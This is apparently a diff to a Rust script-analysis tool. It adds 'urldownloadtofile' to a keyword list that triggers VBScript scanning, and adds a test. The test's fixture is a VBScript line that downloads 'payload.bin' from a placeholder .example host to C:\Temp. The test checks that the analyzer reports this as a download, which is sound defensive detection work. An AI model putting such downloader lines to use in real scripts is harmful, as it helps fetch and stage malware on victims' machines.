@@ -3783,6 +3783,7 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
         b"option explicit",
         b"application.startuppath",
         b"executeexcel4macro",
+        b"urldownloadtofile",
     ]
     .iter()
     .any(|needle| contains_ascii_case_insensitive_bytes(input, needle));
@@ -21418,6 +21419,31 @@ Main"#;
             report.deobfuscated.contains("Public Sub Main()\nSet sh"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_sub_urldownloadtofile_is_scanned() {
+        let vbs = br#"Sub ScriptMain()
+URLDownloadToFile 0, "https://standalone-vbs-urldown-sub.example/payload.bin", "C:\Temp\payload.bin", 0, 0
+End Sub"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-vbs-urldown-sub.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from standalone Sub URLDownloadToFile: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "standalone Sub URLDownloadToFile input was not queued as VBS"
         );
     }
 
